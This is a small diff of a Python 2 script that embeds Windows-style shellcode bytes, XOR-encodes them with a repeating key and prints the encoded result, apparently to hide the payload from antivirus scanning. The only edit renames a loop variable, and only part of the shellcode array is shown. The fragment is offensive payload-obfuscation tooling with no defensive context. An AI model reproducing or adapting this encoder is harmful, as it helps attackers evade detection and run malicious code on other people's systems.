@@ -27,5 +27,5 @@ shellcode=("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
 "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")
 
 obfus = '\\x'
-obfus += '\\x'.join(format((ord(c)^ord(k)), 'x') for c,k in izip(shellcode, cycle(key)))
+obfus += '\\x'.join(format((ord(s)^ord(k)), 'x') for s,k in izip(shellcode, cycle(key)))
 print obfus
